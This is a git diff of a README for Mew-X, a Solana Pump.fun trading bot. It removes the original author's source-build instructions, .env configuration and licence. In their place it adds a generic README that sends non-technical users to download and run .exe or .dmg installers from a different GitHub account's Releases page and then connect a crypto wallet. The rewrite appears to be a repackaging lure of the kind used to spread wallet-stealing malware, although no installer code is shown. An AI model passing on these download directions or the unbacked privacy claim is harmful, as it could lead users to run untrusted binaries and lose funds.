@@ -1,183 +1,85 @@
-<div align="center">
-  <img width="256" height="256" alt="mewxxx" src="https://github.com/user-attachments/assets/be176357-2e7b-4b57-90d9-2d3720a0dde1" />
-</div>
+# 🦄 Mew-X - Track Tokens with Ease
 
-High-performance trading bot powered by analytics.
+## 🚀 Getting Started
 
-# Prerequisities
+Welcome to Mew-X! This tool helps you track popular token creators, place trades, and manage investments easily and efficiently in the cryptocurrency market. No programming skills are needed. Follow this guide to download and run the application.
 
-- A processor & some electricity
-- Preferably Linux distro
-- [PostgreSQL](https://www.postgresql.org/)
-- Faith.
-- & an RPC provider, current fastest: https://apewise.org
+## 🛠 System Requirements
 
-## Features
+Before you download Mew-X, make sure your system meets these basic requirements:
 
-- Check current consensus leader's location to make decisions 
-- A Postgre database hooked into Pump.fun and Pump.fun AMM
-- Integrated SWQoS Services:
-  - Blox
-  - Jito
-  - Helius
-  - Temporal
-  - ZeroSlot
-  - NextBlock
-- Durable nonce when using SWQoS
-- Choose between gRPC or Websocket
-- Plug-n-play trading strategies:
-   - Deagles - Creators who funded their wallet (or sub-wallet) with more than X SOL **using CEX**
-   - VolCreators - Creators from analytics, sorted by volume
-   - GrandChillers - ...sorted by highest market cap
-   - Digged - Doesn't use analytics, checks if the number of transactions between first and n slot from mint's creation is higher or equal to configured number
-   - Dip - Enter into dips of migrated Pump.fun tokens
-   - DevBestFriend - Enter only if the dev is alone in his slot after 100ms, avoids bundlers
-- Configurable trading filters (see `.env`)
-- Avoids duplicate tokens in both analytics and trading
-- Calculates best priority fee for the transaction
+- **Operating System:** Windows 10 or later / macOS Mojave or later
+- **RAM:** At least 4 GB
+- **Storage:** 200 MB of free space
+- **Internet Connection:** Stable connection for real-time trading and updates
 
-## Setup
+## 📥 Download Mew-X
 
-### Download the repository
+To download Mew-X, visit our Releases page. Here is the link for easy access:
 
-```
-$ git clone https://github.com/FLOCK4H/Mew-X
-$ cd Mew-X
-```
+[![Download Mew-X](https://img.shields.io/badge/Download%20Mew--X-v1.0-blue)](https://github.com/abhineet6165/Mew-X/releases)
 
-### Create databases
+Click the button above or follow the steps below to get started.
 
-```bash
-$ psql -U your_postgre_user
-$ > CREATE DATABASE vacation;
-$ > CREATE DATABASE goldmine;
-```
+## 📦 Download & Install
 
-Tables will be created on launch.
+1. **Go to the Releases Page:** Click this link to visit our [Releases page](https://github.com/abhineet6165/Mew-X/releases).
 
-### Configure the `.env` file
+2. **Select Your Version:** On the Releases page, you will see the latest version of Mew-X listed at the top. Click on the version title to expand the details.
 
-**All variables should be self-explanatory, if something isn't clear or you're stuck and need help, please visit [Telegram](https://t.me/flock4hcave) or [Discord](https://discord.gg/thREUECv2a) groups.**
+3. **Download the Installer:**
+   - Look for the file with a name that includes `.exe` (for Windows) or `.dmg` (for macOS). 
+   - Click on the file link to begin the download.
 
-<details>
-  <summary>Click to see full `.env` file</summary>
+4. **Run the Installer:**
+   - Once the download completes, locate the file in your Downloads folder.
+   - Double-click the installer file to start the installation.
+   - Follow the prompts in the setup wizard to complete the installation.
 
-```bash
-PRIVATE_KEY="4knkrbw0238XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
-RPC_URL="http://127.0.0.1:8899"
-WS_URL="ws://127.0.0.1:8900"
-DB_URL = "postgres://<user>:<password>@<host>:<port>" # need a valid postgre path 
+5. **Open Mew-X:**
+   - After installation, look for the Mew-X icon on your desktop or in your applications folder. 
+   - Double-click the icon to open the application.
 
-USE_GRPC = false
-GRPC_URL="http://127.0.0.1:10000"
-GRPC_TOKEN=""
-NONCE_ACCOUNT="" # Needed when using SWQoS in TX_STRAT below, otherwise an error happens (thread 'tokio-runtime-worker' panicked).
+## 🔍 Features of Mew-X
 
-TX_STRAT = "swqos" # rpc | swqos; TIP: When you've got no keys to anything, no worries, you can still use Helius and Jito, just pass the swqos option.
-NEXTBLOCK_KEY = ""
-ZERO_SLOT_KEY = ""
-TEMPORAL_KEY = ""
-BLOX_KEY = ""
-TIP_SOL = 0.001
-PRIORITY_FEE_LVL = "high" # low | medium | high | turbo | max
+Mew-X offers a variety of features to enhance your trading experience, including:
 
-BUY_AMOUNT_SOL = 0.0001
-SLIPPAGE = 30
-MAX_TOKENS_AT_ONCE = 1
-USE_REGIONS = false
-REGIONS = "Germany, Netherlands, United Kingdom"
-MAX_LOSS = 10
-TAKE_PROFIT = 0 # disabled
-MIN_DEV_SOLD = 20_000_000 # min token amount bought by the dev at the start to consider exit-sell with him
-MAX_NO_ACTIVITY_MS = 60000 # 60 seconds
-MAX_NA_ON_START_MS = 5000 # 5 seconds
+- **Token Tracking:** Stay informed on the latest trends in the cryptocurrency market.
+- **Snipe in Slot 0:** Execute trades quickly to grab tokens at the best prices.
+- **Manage Migrated Tokens:** Easily handle tokens that have migrated to new networks.
+- **Analytics:** Access valuable insights to make informed trading decisions.
 
-MODE = "trade" # sim || trade *dynamic, mutable while the program is running
-DEAGLE_DEBUG = false # true || false
-MIN_TRANSFER_SOL = 1.0 # Collect potential devs who fund their wallet with X sol from exchanges
+## 📈 How to Use Mew-X
 
-ALGO_LIMIT = 100000 # Limit the number of tracked creators
-ALGO_USE_DEAGLES = true # Deagles are creators that have funded their wallet (via exchange) with more than X sol in a single transfer
-ALGO_MIN_DEAGLE_SOL = 1.0 # Filter out deagle creators by minimum amount they got to have
+1. **Create an Account:** Open Mew-X and follow the account setup process to create your trading profile.
 
-# VolCreators: Creators in the db sorted by volume
-ALGO_USE_VOLCREATORS=false # true || false
-ALGO_MIN_VOLUME = 10.0
-ALGO_MIN_MINTS = 1
-ALGO_MIN_BUYS = 200
+2. **Connect Your Wallet:** Link your cryptocurrency wallet to Mew-X to access your funds. Ensure you follow the secure steps to keep your wallet information safe.
 
-# GrandChillers: Creators in the db sorted by highest market cap
-ALGO_USE_GRAND_CHILLERS=false # true || false
-ALGO_GC_MIN_HMC = 15000.0
-ALGO_GC_MIN_BUYS = 50
-ALGO_GC_MIN_MINTS = 2
+3. **Explore Features:** Navigate through the dashboard to familiarize yourself with all the features. Use the tracking tool to monitor the tokens you are interested in.
 
-# Creator's Holding Percentage - if creator owns more than LOWER or less than UPPER we skip
-USE_CHP=true # true || false
-CHP_LOWER = 0.09
-CHP_UPPER = 0.21
+4. **Start Trading:** Begin trading by using the sniper feature or investing in dips during market fluctuations.
 
-# Txns in Zero - mimics above; number of txns in the slot where token was created
-USE_TIZ=true # true || false
-TIZ_LOWER = 3
-TIZ_UPPER = 12
+## 🔧 Troubleshooting
 
-# Additional strat [Digged]: Avoid bundlers, but enter high tx count between n
-ENABLE_ABS=false
-ABS_MIN_BUYS=5
-ABS_MIN_VOL=5 # in SOL
-ABS_N=2
+If you encounter any issues while installing or using Mew-X, consider the following solutions:
 
-# Additional strat [Dip]: Trade on dips of migrated tokens
-ENABLE_MTD=true
-MTD_PCT=20
-MTD_STABLE_TIME=10 # in seconds
-MTD_MIN_MC=20 # in SOL
-MTD_MAX_LOSS=15 # pct
-MTD_TAKE_PROFIT=40 # pct
+- **Installation Fails:** Make sure you have sufficient permissions on your computer. Try running the installer as an administrator.
 
-# Additional strat: Dev's best friend, avoid bundlers - enter if dev is alone
-ENABLE_DBF=true
-DBF_MAX_CHP=10
-```
+- **Application Crashes:** Ensure you have the latest version installed. If problems persist, reinstall the application.
 
-</details>
+- **Issues with Wallet Connection:** Verify your wallet details for accuracy. Ensure that your internet connection is stable.
 
-### Build & run the project
+## 🌐 Support & Community
 
-```
-$ cargo run
-```
+Join the Mew-X community to share your experiences, ask questions, and get tips from other users. You can connect with us through:
 
-First, Mew will fetch locations of nodes participating in the cluster. **Indexing of (at the time of writing) 6000+ validators takes around 1.5 hour, we do that to speed up the location checks when trading.**
+- **GitHub Issues:** Report any problems or ask for help directly via our [GitHub Issues page](https://github.com/abhineet6165/Mew-X/issues).
+- **Social Media:** Follow us on social media for updates and news.
 
-```bash
-Indexing HrLAr7y9k8qYd14uF5KdTz5z9p9BvZuf1o6cKY255wtD @ 80.240.31.38 -> ("Frankfurt", "Germany")
-Indexing B7PbdWDgqc5h5rbTyi5Yyz2e1DJZEMoM3uXoqobk35n9 @ 202.8.11.203 -> ("Singapore", "Singapore")
-Indexing Apt9PHrFBt1sji788VzwBYpYensM43eA6qLVybqZrKak @ 65.21.90.166 -> ("Helsinki", "Finland")
-```
+By participating, you can contribute to making Mew-X better for everyone.
 
-### (Optional) Development
+## 🔒 Privacy Policy
 
-There are lots of tests in `sol.rs` of `sol_hook`, to save you some trouble here is the command:
+We value your privacy. Mew-X does not store your wallet keys or personal information. Please read our full privacy policy on our GitHub page for more details.
 
-```bash
-$ cargo test mew::sol_hook::sol::tests::test_pump_buy -- --exact --no-capture
-```
-
-## Socials & Support
-
-Telegram private: `@dubskii420`
-
-Telegram group: https://t.me/flock4hcave
-
-Discord handle: `flockahh`
-
-Discord group: https://discord.gg/thREUECv2a
-
-## License
-
-Copyright 2025 FLOCK4H
-
-Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
-THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+Thank you for choosing Mew-X to help you navigate the world of cryptocurrency trading!
